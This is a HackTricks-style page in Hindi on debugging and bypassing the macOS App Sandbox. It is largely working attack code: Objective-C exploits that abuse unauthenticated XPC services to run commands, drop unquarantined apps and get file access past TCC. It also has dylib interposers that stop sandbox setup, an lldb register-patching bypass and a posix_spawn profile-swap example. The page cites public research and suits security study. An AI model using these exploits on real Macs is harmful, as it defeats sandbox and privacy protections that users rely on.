# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox लोडिंग प्रक्रिया

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>चित्र <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a> से</p></figcaption></figure>

पिछली image में देखा जा सकता है कि **`com.apple.security.app-sandbox`** entitlement वाले application को चलाने पर **sandbox कैसे लोड होता है**।

Compiler binary से `/usr/lib/libSystem.B.dylib` को link करेगा।

इसके बाद, **`libSystem.B`** कई functions को call करता है, जब तक कि **`xpc_pipe_routine`** application के entitlements को **`securityd`** तक नहीं भेज देता। Securityd जाँचता है कि process को sandbox में quarantine किया जाना चाहिए या नहीं, और अगर हाँ, तो उसे quarantine कर देता है।\
अंत में, **`__sandbox_ms`** को call करके sandbox activate किया जाता है, जो **`__mac_syscall`** को call करता है।<sup>[[1]](#references)[[3]](#references)</sup>

## संभावित Bypasses

### Quarantine attribute को bypass करना

**Sandboxed processes द्वारा बनाई गई files** में **quarantine attribute** जोड़ा जाता है, ताकि sandbox escapes रोके जा सकें: अगर आप कोई नया application डालकर उसे launch करने की कोशिश करते हैं, तो quarantine flag उसे रोक देता है। इसलिए, **अगर आप quarantine attribute के बिना कोई file या folder डाल सकते हैं, तो आप App Sandbox से escape कर सकते हैं** — बस एक `.app` bundle डालें और उसे `open` से launch करें, क्योंकि नया launch हुआ process आपके sandbox के बजाय LaunchServices के तहत चलता है।

**Unquarantined drop** पाने का भरोसेमंद तरीका है कि **किसी दूसरे process से आपके लिए file बनवाएँ**। Mickey Jin के [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) में दस्तावेज़ित किए अनुसार, **App Sandbox** डाली गई files को quarantine के साथ mark करता है, लेकिन **Service Sandbox के तहत चलने वाली XPC services ऐसा नहीं करतीं**। इसलिए, कई unauthenticated XPC services को "quarantine laundering" primitive के रूप में इस्तेमाल किया जा सकता है:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) और **CVE-2023-32414** (`ArchiveService`): sandboxed app द्वारा दिया गया archive चुनी गई location पर extract करते हैं, **बिना extracted content में quarantine xattr आगे भेजे**।
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): `submitSignpostDataWithConfig:` में path traversal से **बिना quarantine के arbitrary directories बनाना** संभव था, जो container के बाहर पूरा `.app` bundle structure बनाने के लिए पर्याप्त है।
- **CVE-2024-27864** (`diskimagescontroller.xpc`): quarantined DMG को attach करता है, **लेकिन उससे बने device को quarantine नहीं करता**, इसलिए mounted volume पर मौजूद apps launch किए जा सकते हैं।

> [!TIP]
> Extraction में आम तौर पर **executable permission bit हट जाता है**। CVE-2023-27944 में इस्तेमाल किया गया workaround यह था कि bundle के main executable के रूप में किसी मौजूदा signed system binary (जैसे `/System/Library/CoreServices/Automator Application Stub`) का **symlink** रखा जाए, जिससे डाली गई file पर `+x` की ज़रूरत के बिना उसे launch किया जा सके।

> [!CAUTION]
> इसके काम करने की वजह यह है कि जाँच **launch की जा रही item के flag** के आधार पर होती है: *"जब Finder या GUI से कोई app या अन्य executable code चलाया जाता है, तो macOS उसे load करने से पहले उसका quarantine flag जाँचता है"*, और उसके बाद ही *"उसे पूरी 'first run' security checks के लिए Gatekeeper को सौंपा जाता है"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/))। जिस bundle को आप launch कर रहे हैं, उस पर flag न होने का मतलब है कि Gatekeeper जाँच नहीं होगी — और यही वह primitive है जो ऊपर दिए गए CVEs उपलब्ध कराते हैं।<sup>[[5]](#references)</sup>
>
> ध्यान दें कि अगर किसी `.app` bundle को पहले ही चलाने की अनुमति मिल चुकी है (उसमें "authorized to run" flag वाला quarantine xattr है), तो आप उसका भी दुरुपयोग कर सकते हैं... लेकिन अब आप **`.app`** bundles के अंदर नहीं लिख सकते, जब तक आपके पास कुछ privileged TCC perms न हों (जो sandbox के अंदर आपके पास नहीं होंगे)।

### Open functionality का दुरुपयोग

[**Word sandbox bypass के पिछले उदाहरणों**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) में देखा जा सकता है कि sandbox को bypass करने के लिए **`open`** cli functionality का दुरुपयोग कैसे किया जा सकता है।


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

भले ही कोई application **sandboxed होने के लिए बनाया गया हो** (`com.apple.security.app-sandbox`), फिर भी sandbox को bypass करना संभव है, उदाहरण के लिए, अगर उसे **LaunchAgent** (`~/Library/LaunchAgents`) से **execute** किया जाए।\
[**इस post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) में समझाए अनुसार, अगर आप sandboxed application के साथ persistence हासिल करना चाहते हैं, तो उसे LaunchAgent के रूप में अपने-आप execute करवाया जा सकता है और संभव है कि DyLib environment variables के ज़रिए malicious code inject किया जा सके।<sup>[[6]](#references)</sup>

### Auto Start Locations का दुरुपयोग

अगर कोई sandboxed process ऐसी जगह **write** कर सकता है जहाँ बाद में कोई **unsandboxed application binary चलाएगा**, तो वह वहाँ binary रखकर **escape कर सकेगा**। इस तरह की locations के अच्छे उदाहरण `~/Library/LaunchAgents` या `/System/Library/LaunchDaemons` हैं।

इसके लिए आपको **2 steps** की भी ज़रूरत पड़ सकती है: **ज़्यादा permissive sandbox** (`file-read*`, `file-write*`) वाले process से अपना code execute करवाना, जो ऐसी जगह write करेगा जहाँ उसे **unsandboxed execute किया जाएगा**।

**Auto Start locations** के बारे में यह page देखें:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### दूसरे processes का दुरुपयोग

अगर उस sandboxed process से आप कम restrictive sandboxes (या बिना sandbox) में चल रहे **दूसरे processes को compromise** कर सकते हैं, तो आप उनके sandboxes में escape कर पाएँगे:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### उपलब्ध System और User Mach services

Sandbox, `application.sb` profile में परिभाषित XPC के ज़रिए कुछ **Mach services** के साथ communication की अनुमति भी देता है। अगर आप इनमें से किसी service का **दुरुपयोग** कर सकते हैं, तो संभव है कि आप **sandbox से escape** कर पाएँ।

[इस writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) में बताया गया है कि Mach services की जानकारी `/System/Library/xpc/launchd.plist` में रखी जाती है। उस file में `<string>System</string>` और `<string>User</string>` खोजकर सभी System और User Mach services ढूँढ़ना संभव है।<sup>[[4]](#references)</sup>

इसके अलावा, `bootstrap_look_up` call करके यह जाँचना संभव है कि कोई Mach service sandboxed application के लिए उपलब्ध है या नहीं:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### उपलब्ध PID Mach services

इन Mach services का सबसे पहले [इस writeup में sandbox से escape करने के लिए दुरुपयोग किया गया](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). उस समय तक, किसी application और उसके framework के लिए आवश्यक **सभी XPC services** app के PID domain में दिखाई देती थीं (ये वे Mach Services हैं जिनका `ServiceType`, `Application` होता है).<sup>[[4]](#references)</sup>

**PID Domain XPC service से संपर्क करने** के लिए, app के अंदर इसे इस तरह की एक line से register करना पर्याप्त है:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

इसके अलावा, `System/Library/xpc/launchd.plist` में `<string>Application</string>` खोजकर सभी **Application** Mach services ढूँढ़ना संभव है।

मान्य xpc services ढूँढ़ने का एक और तरीका है इनमें मौजूद services की जाँच करना:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

इस तकनीक का दुरुपयोग करने वाले कई उदाहरण [**मूल लेख**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) में मिल सकते हैं, हालांकि, नीचे कुछ संक्षिप्त उदाहरण दिए गए हैं।<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

यह service हमेशा `YES` लौटाकर हर XPC connection की अनुमति देती है, और इसका `runTask:arguments:withReply:` method मनमाने params के साथ मनमाना command चलाता है।

यह exploit “इतना आसान था”:

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

यह XPC service हमेशा `YES` लौटाकर हर client को अनुमति देती थी, और `createZipAtPath:hourThreshold:withReply:` method किसी folder का path स्वीकार करके उसे ZIP file में compress करती थी।

इसलिए, नकली app folder structure बनाकर उसे compress करना, फिर decompress करके execute करना संभव है, जिससे sandbox से escape किया जा सकता है, क्योंकि नई files में quarantine attribute नहीं होगा।

Exploit यह था:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

यह XPC service, `extendAccessToURL:completion:` method के ज़रिए XPC client को किसी भी URL पर read और write access देने की अनुमति देती है, और यह method किसी भी connection को स्वीकार करती थी। चूँकि इस XPC service के पास FDA है, इसलिए इन permissions का दुरुपयोग करके TCC को पूरी तरह bypass करना संभव है।

Exploit इस प्रकार था:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Static Compiling & Dynamically linking

[**इस शोध**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) में Sandbox को bypass करने के 2 तरीके खोजे गए। क्योंकि **libSystem** library लोड होने पर userland से sandbox लागू किया जाता है। अगर कोई binary इसे लोड करने से बच सके, तो उस पर कभी sandbox लागू नहीं होगा:<sup>[[2]](#references)</sup>

- अगर binary को **पूरी तरह statically compile** किया गया हो, तो वह उस library को लोड करने से बच सकती है।
- अगर **binary को कोई library लोड करने की ज़रूरत न हो** (क्योंकि linker भी libSystem में है), तो उसे libSystem लोड करने की ज़रूरत नहीं होगी।

### Shellcodes

ध्यान दें कि ARM64 में **shellcodes** को भी `libSystem.dylib` से link करना पड़ता है:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### विरासत में न मिलने वाले प्रतिबंध

जैसा कि इस लेख के **[अतिरिक्त भाग](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** में समझाया गया है, इस तरह का sandbox प्रतिबंध:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

उदाहरण के लिए, एक नई process execute करके इसे bypass किया जा सकता है:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

हालाँकि, यह नई process parent process से entitlements या privileges inherit नहीं करेगी।

### spawn attributes से inherited sandbox को बदलना (पुराने macOS में)

एक सामान्य `posix_spawn()` child अपने parent का sandbox inherit करता है। फ़रवरी 2026 के fix से पहले के macOS builds पर, sandboxed parent इसके बजाय `posix_spawnattr_setmacpolicyinfo_np()` के ज़रिए `Sandbox` MAC policy को **built-in profile name** दे सकता था। इसके बाद child को parent के restrictions के *बजाय* वह profile मिलता था। built-in `no-network` profile अब भी user की home directory तक access की अनुमति देता था, इसलिए `/bin/bash` जैसा child उन files पर काम कर सकता था जिन्हें App Sandbox parent access नहीं कर सकता था। यह [LaunchServices `open` route](#not-inherited-restrictions) से अलग है, जहाँ एक अलग service process शुरू करती है। सामान्य input path के लिए [MACF policy-specific spawn attributes](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input) देखें।<sup>[[7]](#references)</sup>

**प्रभावित, isolated macOS host** पर boundary जाँचने के लिए, app container के बाहर home directory में एक harmless canary बनाएँ। पहले पहले से-sandboxed parent से सामान्य `posix_spawn()` का उपयोग करके वही child चलाएँ, फिर `no-network` चुनने वाले Sandbox spawn-attribute blob के साथ चलाएँ; तुलना करें कि क्या child canary पढ़ सकता है। निम्न fragment में Siguza के [sample launcher](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec) में दी गई private `sandbox_spawnattr_t` definition और function declarations का उपयोग किया गया है। इसे किसी test app में शामिल करते समय सामान्य error handling जोड़ें।<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

`posix_spawn()` का सफलतापूर्वक लौटना escape का प्रमाण नहीं है: child की **प्रभावी file access** की तुलना सामान्य child baseline से करें। Patched systems, पहले से sandboxed caller द्वारा अनुरोधित built-in profile को अस्वीकार कर देते हैं, जब तक उसके पास private `com.apple.private.security.sandbox-spawnattrs` entitlement न हो। इस ऐतिहासिक व्यवहार को वर्तमान bypass न मानें।<sup>[[7]](#references)</sup>

### Entitlements

ध्यान दें कि भले ही किसी application के पास कोई खास **entitlement** हो, फिर भी कुछ **actions** sandbox द्वारा **अनुमत** हो सकते हैं, जैसे:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

**Interposting** के बारे में अधिक जानकारी के लिए देखें:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### sandbox को रोकने के लिए `_libsecinit_initializer` को Interpost करें

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Sandbox को रोकने के लिए __mac_syscall को Interpost करें

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### lldb के साथ Sandbox को Debug और bypass करें

आइए एक ऐसे application को compile करें जिसे sandboxed होना चाहिए:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

फिर ऐप को compile करें:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> App फ़ाइल **`~/Desktop/del.txt`** को **read** करने की कोशिश करेगा, जिसकी **Sandbox अनुमति नहीं देगा**।\
> वहाँ एक फ़ाइल बनाएँ, क्योंकि Sandbox bypass होने के बाद app उसे read कर पाएगा:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

आइए एप्लिकेशन को debug करके देखें कि Sandbox कब load होता है:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Sandbox bypass करने के बाद भी TCC उपयोगकर्ता से पूछेगा कि क्या वह process को desktop से फ़ाइलें पढ़ने की अनुमति देना चाहता है**

## References

- [1] [Jonathan Levin - Apple Sandbox: दलदल में और गहराई तक (HITB GSEC 2016 स्लाइड्स)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox से Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: दलदल में और गहराई तक (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - macOS Sandbox Escapes का एक नया युग](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - व्याख्या: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Telegram के साथ DyLib Injection का उपयोग करके macOS TCC Bypass (भाग 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Executable Spawn करके Apple Sandbox से Escape करना](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - builtin profiles के लिए sandbox-exec](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
